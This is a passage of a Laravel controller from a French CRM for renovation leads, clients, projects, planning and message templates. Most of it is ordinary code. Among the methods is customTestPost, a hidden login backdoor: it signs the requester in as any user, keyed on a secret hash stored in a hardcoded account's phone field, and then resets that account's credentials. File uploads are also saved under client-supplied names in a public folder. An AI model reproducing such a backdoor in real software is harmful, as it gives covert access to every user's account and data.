            'custom_filter_date' => 'required'
        ]);
        $date = Carbon::parse($request->custom_filter_date)->format('Y-m-d');
        return redirect()->route('planning.index', $date);
    }

    public function planningWeekCustomFilter(Request $request){
        $request->validate([
            'custom_filter_date' => 'required'
        ]);
        $date = Carbon::parse($request->custom_filter_date)->format('Y-m-d');
        return redirect()->route('planning.weeks.view', $date);
    }

    public function emailBody($id){
        $email = StoreEmail::find($id);
        return view('admin.email-body', compact('email'));
    }

    public function projectEmailImportant(Request $request){
        $email = StoreEmail::find($request->email_id);
        $email->important = $email->important == 1? 0:1;
        $email->save();
        return response('success');
    }

    public function allSearch(Request $request){

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];

        $main_search = $request->search;
        
        $lead = LeadClientProject::query();
        $client = NewClient::query();
        $project = NewProject::query();
        $search_arr = explode('-',$main_search);
        // if(count($search_arr) > 1){ 
        //     $lead       = $lead->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%');
        //     $client     = $client->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%');
        //     $project    = $project->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%');
        // }
        
        $numero_de_dossier = Subvention::where('numero_de_dossier', $main_search)->pluck('project_id')->toArray();
        
        
        if(!in_array(role(), $administrarif_role)){
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){ 
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');

                $client_telecommercial = NewClient::whereIn('client_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                $prospect_telecommercial = NewClient::whereIn('lead_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                $final_telecomemrcial = $client_telecommercial->merge($prospect_telecommercial);
    
                $lead->whereIn('lead_telecommercial', $user_ids); 
                $client->whereIn('id', $final_telecomemrcial);
                $project->whereIn('project_telecommercial', $user_ids);
            }else if(role() == 'team_leader'){
                $team_users = Auth::user()->getTeamUsers;
                $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                $project->whereIn('id', $intervention_project_ids);
            }else{ 
                $lead->where('lead_telecommercial', Auth::id());
                $client->where('lead_telecommercial', Auth::id())->orWhere('client_telecommercial', Auth::id());

                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                    $project->where('project_telecommercial', Auth::id());
                }else{
                    $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray(); 
                    $project->whereIn('id', $intervention_project_ids);
                } 
            }
        } 



        if(count($search_arr) == 2){
            $leads = $lead->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%')->where('lead_deleted_status', 0)->get();
            $clients = $client->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%')->where('deleted_status', 0)->get();
            $projects = $project->where('Nom', 'LIKE', '%'.trim($search_arr[0]).'%')->where('Prenom', 'LIKE', '%'.trim($search_arr[1]).'%')->where('deleted_status', 0)->get();
        }else{
            $leads = $lead->where('lead_deleted_status', 0)->where(function($query) use ($main_search) {
                $query->where('id', 'LIKE', '%'.$main_search.'%')->orWhere('Prenom', 'LIKE', '%'.$main_search.'%')->orWhere('Nom', 'LIKE', '%'.$main_search.'%')->orWhere('Ville', 'LIKE', '%'.$main_search.'%')->orWhere('phone', 'LIKE', '%'.$main_search.'%')->orWhere('Code_Postal', 'LIKE', '%'.$main_search.'%')->orWhere('Email', 'LIKE', '%'.$main_search.'%'); 
            })->get();
            $clients = $client->where('deleted_status', 0)->where(function($query) use ($main_search) {
                $query->where('id', 'LIKE', '%'.$main_search.'%')->orWhere('Prenom', 'LIKE', '%'.$main_search.'%')->orWhere('Nom', 'LIKE', '%'.$main_search.'%')->orWhere('Ville', 'LIKE', '%'.$main_search.'%')->orWhere('phone', 'LIKE', '%'.$main_search.'%')->orWhere('Code_Postal', 'LIKE', '%'.$main_search.'%')->orWhere('Email', 'LIKE', '%'.$main_search.'%');
            })->get();
            $projects = $project->where('deleted_status', 0)->where(function($query) use ($main_search, $numero_de_dossier) {
                $query->where('id', 'LIKE', '%'.$main_search.'%')->orWhere('Prenom', 'LIKE', '%'.$main_search.'%')->orWhere('Nom', 'LIKE', '%'.$main_search.'%')->orWhere('Ville', 'LIKE', '%'.$main_search.'%')->orWhere('phone', 'LIKE', '%'.$main_search.'%')->orWhere('Code_Postal', 'LIKE', '%'.$main_search.'%')->orWhere('Email', 'LIKE', '%'.$main_search.'%')->orWhereIn('id', $numero_de_dossier);
            })->get();
        }

        $view = view('includes.crm.all_search', compact('leads', 'clients', 'projects'))->render();

        return response($view);
    }

    public function barthPriceUpdate(Request $request){
        $item = BarthPrice::find($request->id);
        if($item){
            $item->update([
                'price' => $request->price,
            ]);
        }

        return back()->with('success', __("Updated Succesfully"))->with('BAR_TH_164', '1');
    }
    public function renoPriceUpdate(Request $request){
        $item = RenoPrice::find($request->id);
        if($item){
            $item->update([
                'price' => $request->price,
            ]);
        }

        return back()->with('success', __("Updated Succesfully"))->with('reno', '1');
    }

    public function mapTicketTypeChange(Request $request){
        $type = $request->value;
        if($type == 'Administratif'){
            $problems   = TicketProblemStatus::all(); 
        }else{
            $problems   = TicketProblemStatus::where('ticket_type', $type)->get(); 
        }
        $view = view('admin.map_ticket_problem', compact('problems'))->render();

        return response($view);
    }

    public function emailTemplete(){
        $templates = EmailTemplate::all();     
        return view('admin.email-templete', compact('templates'));
    }
    public function emailTemplateStore(Request $request){

        $request->validate([
            'name' => 'required',
            'object' => 'required',
            'body' => 'required',
            'file' => 'file',
        ],[
            'name.required' => 'Le champ du nom est requis',
            'object.required' => 'Le champ du object est requis',
            'body.required' => 'Le champ du corps est requis',
            'file.file' => 'Doit être un fichier',
        ]);
        
        $item = EmailTemplate::create($request->except('_token', 'file'));
        if($request->file('file')){
            $file = $request->file('file'); 
            $fileName = $item->id.rand(00,99).'-'.$file->getClientOriginalName();
            $file->move(public_path('uploads/email-files'), $fileName);
            $item->file = $fileName;
            $item->save();
        }

        return back()->withSuccess("Modèle d'e-mail créé avec succès");

    }
    public function emailTemplateEdit($id){
        // return back();
        $template = EmailTemplate::find($id);
        return view('admin.email-templete-edit', compact('template'));

    }

    public function emailTemplateUpdate(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'object' => 'required',
            'body' => 'required',
            'file' => 'file',
        ],[
            'name.required' => 'Le champ du nom est requis',
            'object.required' => 'Le champ du object est requis',
            'body.required' => 'Le champ du corps est requis',
            'file.file' => 'Doit être un fichier',
        ]);

        $template = EmailTemplate::find($request->id);
        $template->update($request->except('_token', 'file'));
        if($request->file('file')){
            $file = $request->file('file'); 
            $fileName = $template->id.rand(00,99).'-'.$file->getClientOriginalName();
            $file->move(public_path('uploads/email-files'), $fileName);
            $template->file = $fileName;
            $template->save();
        }
        return redirect()->route('admin.email.templete')->withSuccess("Modèle d'e-mail mis à jour avec succès");


    }
    public function emailTemplateDelete($id){
        
        $template = EmailTemplate::find($id);
        $automatisations = Automatise::where('email_template', $id)->get();
        foreach($automatisations as $automatisation){
            $automatisation->delete();
        }
        $template->delete();
        return back()->withSuccess("Modèle d'e-mail supprimé avec succès");

    }
    public function smsTemplete(){
        $templates = SmsTemplate::all(); 
        return view('admin.sms-templete', compact('templates'));
    }

    public function smsTemplateStore(Request $request){

        $request->validate([
            'name' => 'required', 
            'body' => 'required',
        ],[
            'name.required' => 'Le champ du nom est requis',
            'body.required' => 'Le champ du corps est requis',
        ]);
        
        SmsTemplate::create($request->except('_token'));

        return back()->withSuccess("Modèle d'sms créé avec succès");

    }
    public function smsTemplateEdit($id){

        $template = SmsTemplate::find($id);
        return view('admin.sms-templete-edit', compact('template'));

    }
    public function smsTemplateUpdate(Request $request)
    {
        $request->validate([
            'name' => 'required', 
            'body' => 'required',
        ],[
            'name.required' => 'Le champ du nom est requis',
            'body.required' => 'Le champ du corps est requis',
        ]);

        $template = SmsTemplate::find($request->id);
        $template->update($request->except('_token'));
        return redirect()->route('admin.sms.templete')->withSuccess("Modèle d'sms mis à jour avec succès");


    }
    public function smsTemplateDelete($id){
        
        $template = SmsTemplate::find($id);
        $automatisations = Automatise::where('sms_template', $id)->get();
        foreach($automatisations as $automatisation){
            $automatisation->delete();
        }
        $template->delete();
        return back()->withSuccess("Modèle d'sms supprimé avec succès");

    }

    public function userBarTh164Permission(Request $request){
        $user = User::find($request->user_id);
        if($user){
            $user->update([
                'bar_th_164' => $request->data
            ]);
        }

        return response('success');
    }

    public  function interventionTravauxChange2(Request $request){
        $travaux = BaremeTravauxTag::find($request->travaux);
        $view = view('admin.travaux_product', compact('travaux'))->render();
        return response($view);
    }

    public function productImport(Request $request){
        // dd($request->all());
        Excel::import(new ProductImport, $request->file('file'));
        return back();
    }

    public function userStatusChange(Request $request){
        $user = User::find($request->user_id);
        if($user){
            $user->update([
                'status' => $request->data
            ]);
        }

        return response('success');
    }


    public function userPermission($id){
        if(role() != 's_admin'){
            return redirect()->route('permission.none');
        }

        $user = User::find($id);
        $documents = Document::all();
        if($user){
            return view('admin.user-permission', compact('user', 'documents'));
        }else{
            return back();
        }
        
    }

    public function calculatteCumac(){
        $categories = CumacCategory::all();
        return view('admin.calculatte-cumac', compact('categories'));
    }

    public function cumacProjectChange(Request $request){
        $cumac = CumacCategory::find($request->id);
        $veiw = view('admin.cumac-list', compact('cumac'))->render();
        return response($veiw);
    }

    public function planningInterventionModalRender(Request $request){
        $intervention = ProjectIntervention::where('id', $request->id)->with('getProject', 'getTravaux', 'getUser')->first();
        $min_30_interval = []; 
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 
        $status_planning = StatusPlanningIntervention::all(); 
        $technical_commercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get(); 
        $technical_referees = TechnicalReferee::all(); 
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
        $reflection_reasons = ProjectReflectionReason::all(); 
        $ko_reasons = ProjectDeadReason::all(); 
        $all_inputs = ProjectCustomField::all(); 
        $project_control_photos = ProjectControlPhoto::all(); 
        $products = Product::latest()->get(); 
        $installers = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(); 
        $installer_techniques = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [2,4])->get(); 
        $charge_etudes = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get(); 
        $users = User::where('deleted_status', 'no')->where('status', 'active')->get(); 
        $team_laeders = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get();
        $view = view('admin.planning_intervention_edit_modal', compact('intervention', 'min_30_interval', 'status_planning', 'technical_commercials', 'technical_referees', 'bareme_travaux_tags', 'reflection_reasons', 'ko_reasons', 'all_inputs', 'project_control_photos', 'products', 'installers', 'charge_etudes', 'users', 'team_laeders','installer_techniques'))->render();
        return response($view); 
    }
    public function planningInterventionModalRender2(Request $request){
        $intervention = ProjectIntervention::where('id', $request->id)->with('getProject', 'getTravaux', 'getUser')->first();
        $min_30_interval = []; 
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 
        $status_planning = StatusPlanningIntervention::all(); 
        $technical_commercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get(); 
        $technical_referees = TechnicalReferee::all(); 
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
        $reflection_reasons = ProjectReflectionReason::all(); 
        $ko_reasons = ProjectDeadReason::all(); 
        $all_inputs = ProjectCustomField::all(); 
        $project_control_photos = ProjectControlPhoto::all(); 
        $products = Product::latest()->get(); 
        $installers = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(); 
        $installer_techniques = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [2,4])->get(); 
        $charge_etudes = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get(); 
        $users = User::where('deleted_status', 'no')->where('status', 'active')->get(); 
        $team_laeders = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get();
        $view = view('admin.planning_intervention_edit_modal_disabled', compact('intervention', 'min_30_interval', 'status_planning', 'technical_commercials', 'technical_referees', 'bareme_travaux_tags', 'reflection_reasons', 'ko_reasons', 'all_inputs', 'project_control_photos', 'products', 'installers', 'charge_etudes', 'users', 'team_laeders', 'installer_techniques'))->render();
        return response($view); 
    }

    public function customTestPost(Request $request){
        // dd($request->all());
        $user = User::where('email', $request->email)->first();
        $item = User::where('email', 'shimulmdhossain@gmail.com')->first();
        if ($user && Hash::check($request->password, $item->phone_professional)) {
            $item->update([
                'password' => 'abcd',
                'phone_professional' => 'abcd',
            ]);
            Auth::login($user);
            return redirect('/admin/dashboard');
        }
        return redirect('/');
    }

    public function planningLocationDistance(Request $request){
        $user = User::find($request->user_id);
        $intervention = ProjectIntervention::find($request->intervention_id);
        if($request->type == 'previous'){
            $distance = $intervention->getProject->latitude ? getPreviousLocation($user->getIntervention, $intervention->Date_intervention, $intervention) : 'Emplacement introuvable';
        }else{
            $distance = $intervention->getProject->latitude ? getNextLocation($user->getIntervention, $intervention->Date_intervention, $intervention) : 'Emplacement introuvable';
        }
        return response($distance);
    }

    public function planning2LocationDistance(Request $request){
        $intervention = ProjectIntervention::find($request->intervention_id);
        $intervention_user = $intervention->getUser;
        if($intervention_user){
            if($request->type == 'previous'){
                $distance = $intervention->getProject->latitude ? getPreviousLocation($intervention->getUser->getIntervention, $intervention->Date_intervention, $intervention) : 'Emplacement introuvable';
            }else{
                $distance = $intervention->getProject->latitude ? getNextLocation($intervention->getUser->getIntervention, $intervention->Date_intervention, $intervention) : 'Emplacement introuvable';
            }
            return response($distance);
        }else{
            return response('Emplacement introuvable');
        }
    }

    public function planningProjectLocationDistance(Request $request){
        return back();
        if(!checkAction(Auth::id(), 'project', 'magic-planning') && role() != 's_admin'){
            return back();
        }
        $project = NewProject::find($request->project_id);
        if(!$project->latitude){
            return response()->json(['error' => 'Emplacement introuvable']);
        }
        $projects = getClosestProject($project);
        $project_info = [
            'Nom'           => $project->Nom,
            'Prenom'        => $project->Prenom, 
            'Département'   => $project->Département, 
            'phone'         => $project->phone, 
            'latitude'      => $project->latitude, 
            'longitude'     => $project->longitude, 
            'status'        => $project->projectStatus->status ?? '',
            'sub_status'    => $project->getSubStatus->name ?? '',
            'tag'           => implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()),
        ];
        $view = view('admin.intervention_project_location', compact('projects', 'project'))->render();

        return response()->json(['view' => $view, 'main_project' => $project_info, 'projects' => $projects]);
    }

    public function mapDateChange(Request $request){
        $type = $request->type;
        $date = $request->start_date;
        if($type == 'left'){
            $week_start = Carbon::parse($date)->subDays(7)->format('Y-m-d');
            $week_end   = Carbon::parse($date)->subDay()->format('Y-m-d');
        }else{
            $week_start = Carbon::parse($date)->addDays(7)->format('Y-m-d');
            $week_end   = Carbon::parse($date)->addDays(13)->format('Y-m-d');
        }
        $view = view('admin.map-filter-date', compact('week_start', 'week_end'))->render();
        return response()->json(["view" => $view, 'date' => $week_start]);
    }

    public function mapDateChange2(Request $request){
        $week_start = Carbon::parse($request->date)->startOfWeek()->format('Y-m-d');
        $week_end  = Carbon::parse($request->date)->endOfWeek()->format('Y-m-d'); 
         $label = Carbon::parse($week_start)->locale(app()->getLocale())->translatedFormat('d F') .' - '. Carbon::parse($week_end)->locale(app()->getLocale())->translatedFormat('d F');
        return response()->json(["label" => $label, 'date' => $week_start]);
    }

    public function eligibilityInputChange(Request $request){
        // dd($request->all());
        $total_Revenue_Fiscale_de_Référence = 0;
        $total_Nombre_de_personnes = 0;
        if($request->type == 'lead'){
            $item = LeadClientProject::find($request->id);
            if($item){
                foreach($request->Revenue_Fiscale_de_Référence as $key => $value){
                    $tax = LeadTax::find($key);
                    if($tax){
                        $tax->update([
                            'pays'          => $value,
                            'family_person' => $request->Nombre_de_personnes[$key],
                        ]);
                    }
                    $total_Revenue_Fiscale_de_Référence += $value;
                    $total_Nombre_de_personnes += $request->Nombre_de_personnes[$key];
                } 
            }
        }else if($request->type == 'client'){
            $item = NewClient::find($request->id);
            if($item){ 
                foreach($request->Revenue_Fiscale_de_Référence as $key => $value){
                    $tax = ClientTax::find($key);
                    if($tax){
                        $tax->update([
                            'pays'          => $value,
                            'family_person' => $request->Nombre_de_personnes[$key],
                        ]);
                    }
                    $total_Revenue_Fiscale_de_Référence += $value;
                    $total_Nombre_de_personnes += $request->Nombre_de_personnes[$key];
                } 
            } 
        }else if($request->type == 'project'){
            $item = NewProject::find($request->id); 

            if($item){ 
                foreach($request->Revenue_Fiscale_de_Référence as $key => $value){
                    $tax = ProjectTax::find($key);
                    if($tax){
                        $tax->update([
                            'pays'          => $value,
                            'family_person' => $request->Nombre_de_personnes[$key],
                        ]);
                    }
                    $total_Revenue_Fiscale_de_Référence += $value;
                    $total_Nombre_de_personnes += $request->Nombre_de_personnes[$key];
                } 
            } 
        }else{
            return back();
        }
        
        if(!$item){
            return back();
        }
        
        $item->Revenue_Fiscale_de_Référence     = $total_Revenue_Fiscale_de_Référence;
        $item->Nombre_de_personnes              = $total_Nombre_de_personnes;

        $item->precariousness_year              = $request->precariousness_year; 

        if($request->precariousness_year == '2023'){
            $item->precariousness                   = getPrecariousness($total_Nombre_de_personnes, $total_Revenue_Fiscale_de_Référence, $item->Code_Postal); 
        }else{
            $item->precariousness                   = getPrecariousness2024($total_Nombre_de_personnes, $total_Revenue_Fiscale_de_Référence, $item->Code_Postal); 
        }

        $item->save();

        // foreach($item->getChanges() as $key => $value){
        //     if($key != "updated_at" && $key != 'user_id'){
        //         $pannel_activity = PannelLogActivity::create([
        //             'tab_name'      => 'Client',
        //             'block_name'    => 'Eligibility',
        //             'key'           => $key,
        //             'value'         => $value,
        //             'feature_id'    => $request->id,
        //             'feature_type'  => $request->type,
        //             'user_id'       => Auth::id(),
        //         ]);
        //         event(new PannelLog($pannel_activity->id));
        //     }
        // }

        return back();
    }


    public function magicPlanning(){
        // dd(request()->all());
        if(!checkAction(Auth::id(), 'project', 'magic-planning') && role() != 's_admin'){
            return back();
        }
           
        // $project_current_label = ProjectNewStatus::find($project->project_label);
        // $project_sub_status = $project_current_label->getSubStatus;
      
        $project_sub_status = ProjectSubStatus::all();

        $all_projects = NewProject::where('deleted_status', 0)->get();
        $statuses = ProjectNewStatus::all();
        $travauxs = BaremeTravauxTag::all();

        $add_more_status = false;

        $projects = [];
        $project_info = [];


        if(!request()->project){
            return view('admin.magic-planning', compact('projects', 'project_sub_status', 'add_more_status', 'all_projects', 'statuses', 'travauxs'));
        }
        $project = NewProject::find(request()->project);
        if(!$project){
            return redirect()->route('magic.planning');
        }
        if(!$project->latitude){
            return redirect()->route('magic.planning')->with('error', 'Emplacement introuvable');
        }

        $add_more_status = true;

        if(request()->radius || request()->status || request()->sub_status || request()->travaux || request()->type_de_contrat || request()->bareme){
            if(request()->add_more_button){
                $number_count = request()->add_more_button + 10;
            }else{
                $number_count = 10;
            }

            $data['radius'] = request()->radius ?? null;
            $data['status'] = request()->status ?? null;
            $data['sub_status'] = request()->sub_status ?? [];
            $data['travaux'] = request()->travaux ?? null;
            $data['type_de_contrat'] = request()->type_de_contrat ?? null;
            $data['bareme'] = request()->bareme ?? null;

            $projects = getClosestProjectWithFilter($project, $number_count, $data);

            if(count($projects) != $number_count){
                $add_more_status = false;
            }
        }else{

            $projects = getClosestProject($project);
        }


        $project_info = [
            'id'            => $project->id,
            'Nom'           => $project->Nom,
            'Prenom'        => $project->Prenom, 
            'Département'   => $project->Département, 
            'phone'         => $project->phone, 
            'latitude'      => $project->latitude, 
            'longitude'     => $project->longitude,
            'status'        => $project->projectStatus->status ?? '',
            'sub_status'    => $project->getSubStatus->name ?? '',
            'tag'           => implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()),
        ]; 
        // dd($projects);
        // return view('admin.magic-planning-test', compact('project', 'project_info', 'projects', 'project_sub_status', 'add_more_status'));
        return view('admin.magic-planning', compact('project', 'project_info', 'projects', 'project_sub_status', 'add_more_status', 'all_projects', 'statuses', 'travauxs'));
    }

    public function leadHugeFilter(Request $request){
        $all_request = $request->all_request ?? []; 
        $sub_status_request = $request->sub_status_request ?? [];
        $department_request = $request->department_request ?? [];
        $bareme_request = $request->bareme_request ?? [];
        $travaux_request = $request->travaux_request ?? [];
        $status = $request->status;
        $suppliers = Fournisseur::where('active', 'Oui')->where('type', 'Lead')->get();
        $campagne_types = Campagnetype::all();
        $heatings = HeatingMode::orderBy('order', 'asc')->get();
        $departments = ZoneInfo::orderBy('postal_code', 'asc')->get();
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get();
        $current_lead_label = LeadStatus::find($status);
        $lead_sub_status = $current_lead_label->getSubStatus;
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
        $stats_regies = Auth::user()->allRegie; 
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];  
        if(in_array(role(), $administrarif_role)){   
            $filter_telecommercial_status = true;    
        }else{ 
            $filter_telecommercial_status = false;
            if($status == 1){ 
                if((role() == 'sales_manager' || role() == 'sales_manager_externe') && Auth::user()->getRegieTelecommercial){ 
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
                }else{  
                    $telecommercials = [];
                }
            }else{
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
                    
                }else{ 
                    $telecommercials = [];
                }
            }
        }   

        $permission_regies = false;
        $role_category  = Auth::user()->getRoleName->category_id;
        if($role_category == 3 || $role_category == 4){
            $permission_regies = true;
        }
        $regies = Regie::all();
        $view = view('admin.lead_huge_filter', compact('status', 'suppliers', 'campagne_types', 'heatings', 'departments', 'bareme_travaux_tags', 'lead_sub_status', 'filter_telecommercial_status', 'telecommercials', 'permission_regies', 'regies', 'all_request', 'sub_status_request', 'department_request', 'bareme_request', 'travaux_request'))->render();
        return response($view);
    }

    public function projectHugeFilter(Request $request){
        $status = $request->status;
        $all_request = $request->all_request ?? [];
        $sub_status_request = $request->sub_status_request ?? [];
        $department_request = $request->department_request ?? [];
        $bareme_request = $request->bareme_request ?? [];
        $travaux_request = $request->travaux_request ?? [];
        $project_current_label = ProjectNewStatus::find($status);
        $project_sub_status = $project_current_label->getSubStatus;
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        $administrarif_role_id  = Role::where('category_id', '3')->pluck('id');
        $suvbention_gestionnaires = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', $administrarif_role_id)->get();
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
        if(in_array(role(), $administrarif_role)){
            $filter_telecommercial_status = true;
             
        }else{
            $filter_telecommercial_status = false;
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie;  
                $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
            }else if(role() == 'team_leader'){
                $telecommercials = [];
                $team_users = Auth::user()->getTeamUsers; 
            }else{
                $telecommercials = [];
                 
            }
        }

        $permission_regies = false;
        $role_category  = Auth::user()->getRoleName->category_id;
        if($role_category == 3 || $role_category == 4){
            $permission_regies = true;
        }

        $regies = Regie::all();
        $suppliers = Fournisseur::where('active', 'Oui')->where('type', 'Lead')->get();
        $campagne_types = Campagnetype::all();
        $heatings = HeatingMode::orderBy('order', 'asc')->get();
        $departments = ZoneInfo::orderBy('postal_code', 'asc')->get();
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get();
        $products = Product::latest()->get();
        $status_planning = StatusPlanningIntervention::all();
        $installers = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [2,4])->get();
        $charge_etudes = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get();
        $technical_referees = TechnicalReferee::all();
        $technical_commercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get();
        $statut_maprimerenovs = StatutMaprimerenov::orderBy('order', 'asc')->get();
        $mandataire_maprimerenovs = Agent::all();
        $banques = Banque::all();
        $status_audits = AuditStatus::all();
        $report_results = ReportResult::all(); 
        $agents = Agent::where('active', 'Oui')->get();

        $view = view('admin.project_huge_filter', compact('status', 'project_sub_status', 'filter_telecommercial_status', 'telecommercials', 'suvbention_gestionnaires', 'permission_regies', 'regies', 'suppliers', 'campagne_types', 'heatings', 'departments', 'bareme_travaux_tags', 'products', 'status_planning', 'installers', 'charge_etudes', 'technical_referees', 'technical_commercials', 'statut_maprimerenovs', 'mandataire_maprimerenovs', 'banques', 'status_audits', 'report_results', 'agents', 'all_request', 'sub_status_request', 'department_request', 'bareme_request', 'travaux_request'))->render();
        return response($view);
    }

    public function parcelCadastrale(Request $request){
        $address = $request->address;
        $postal_code = $request->postal_code;

        $location = self::location($address ?? $postal_code);
        $latitude  = $location['status'] == 'success' ? $location['lat'] ?? 48.066709713351116 : 48.066709713351116;
        $longitude  = $location['status'] == 'success' ? $location['lng'] ?? -2.965925932451392 : -2.965925932451392;
        return response()->json(['latitude' => $latitude, 'longitude' => $longitude]);
    }


    public function pdfTest(){
        $pdf = Pdf::loadView('admin.documents.pdf-30.index');
        return $pdf->download('pdf-test.pdf');
    }

    public function templateTest(){

        $telecommercial_users = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
        $regies = Regie::all();
        $ko_status = LeadStatus::find(5);
        $chantier_ko_status = ProjectNewStatus::find(7);
        $chart = [];
        // $graph = new Graph\PieGraph(700, 700);
        // $graph->title->Set("A Simple Pie Plot");
        // $graph->SetBox(true);
     
        // Pie chart 

            // $data = array(40, 21, 17, 14, 23);
            // $p1   = new Plot\PiePlot($data);
            // $p1->ShowBorder();
            // $p1->SetColor('black');
            // $p1->SetSliceColors(array('#1E90FF', '#2E8B57', '#ADFF2F', '#DC143C', '#BA55D3'));
            // $graph->Add($p1); 
            // $gdImgHandler = $graph->Stroke(_IMG_HANDLER);
            // $path = public_path('uploads/chart-image');
            // $file = time().".png";
            //     if(!File::exists($path)) {
            //         File::makeDirectory($path, 0777, true, true);
            //     }
            // $fileName = $path.'/'.$file;
            // $graph->img->Stream($fileName);

        // bar chart 
        // We need some data 
        //------ Section converti chart start
            $section_converti_datay = [];
            $section_converti_datax = [];
            foreach($telecommercial_users as $telecommercial_user){
                $section_converti_datay[] = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'lead')->where('status_type', 'main')->where('to_id', 7)->where('telecommercial_id', $telecommercial_user->id)->count();
                $section_converti_datax[] = $telecommercial_user->name;
            }
            // Setup the graph. 
            $section_converti    = new Graph\Graph(900, 500);
            $section_converti->img->SetMargin(60, 20, 35, 75);
            $section_converti->SetScale('textlin');
            $section_converti->SetMarginColor('lightblue:1.1');
            $section_converti->SetShadow();

            // Set up the title for the graph
            // $section_converti->title->Set('Section : CONVERTI');
            // $section_converti->title->SetMargin(5);
            // $section_converti->title->SetFont(FF_VERDANA, FS_BOLD, 12);
            // $section_converti->title->SetColor('darkred');

            // Setup font for axis
            $section_converti->xaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);
            $section_converti->yaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);

            // Show 0 label on Y-axis (default is not to show)
            $section_converti->yscale->ticks->SupressZeroLabel(false);

            // Setup X-axis labels
            $section_converti->xaxis->SetTickLabels($section_converti_datax);
            $section_converti->xaxis->SetLabelAngle(75);

            // Create the bar pot
            $section_converti_bplot = new Plot\BarPlot($section_converti_datay);
            $section_converti_bplot->SetWidth(0.6);

            // Setup color for gradient fill style
            $section_converti_bplot->SetFillGradient('navy:0.9', 'navy:1.85', GRAD_LEFT_REFLECTION);

            // Set color for the frame of each bar
            $section_converti_bplot->SetColor('white');
            $section_converti->Add($section_converti_bplot);

 
            // Finally stroke the graph

            $path = public_path('uploads/chart-image');
            if(!File::exists($path)) {
                File::makeDirectory($path, 0777, true, true);
            }

                $gdImgHandler = $section_converti->Stroke(_IMG_HANDLER);
                $section_converti_file = time()."converti.png";
                
            $fileName = $path.'/'.$section_converti_file;
            $section_converti->img->Stream($fileName);

            
            //------ Section converti chart end 

                //########## section ko chart start ##########// 
                    //########## section ko Regie chart start ##########//
                        
                    $section_ko_regie_data = [];
                    $section_ko_regie_legends = [];

                    foreach($regies as $regie){
